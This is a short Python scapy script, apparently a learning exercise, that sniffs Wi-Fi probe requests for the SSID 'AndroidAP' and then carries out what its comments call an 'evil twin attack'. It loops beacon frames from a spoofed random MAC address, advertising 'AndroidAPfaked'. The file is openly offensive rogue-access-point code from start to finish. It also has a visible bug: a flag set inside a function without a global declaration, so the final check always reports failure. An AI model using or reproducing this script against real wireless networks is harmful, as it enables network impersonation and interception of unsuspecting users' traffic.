# https://semfionetworks.com/wp-content/uploads/2021/04/wireshark_802.11_filters_-_reference_sheet.pdf

from scapy.all import *
from faker import Faker

blSSID = False


# Look for the SSID from prob-req packets
def ssid_finder(pkt):
    print("ssid_finder started")
    if pkt.haslayer(Dot11Elt):
        # verifies that it's a prob request. type 0 = management, subtype 4 = prob req
        if pkt.type == 0 and pkt.subtype == 4:
            if pkt.info.decode() == "AndroidAP":
                print("\nSSID has been found")
                blSSID = True
                evil_twin()


# Function to execute an evil twin attack
def evil_twin():
    # Creates a fake MAC address
    fakedMAC = Faker().mac_address()
    # Creates the packet with the fake MAC and the SSID to simulate the network
    # subtype 8 = beacon
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fakedMAC, addr3=fakedMAC)
    ssid = Dot11Elt(ID="SSID", info="AndroidAPfaked")
    frame = RadioTap()/dot11/Dot11Beacon()/ssid
    print("Sending packets")
    sendp(frame, iface="wlan0", loop=1)

if __name__ == '__main__':
    sniff(iface='wlan0', prn=ssid_finder, timeout=10)
    if(blSSID == False):
        print("SSID NOT FOUND, CLOSING PROGRAM")
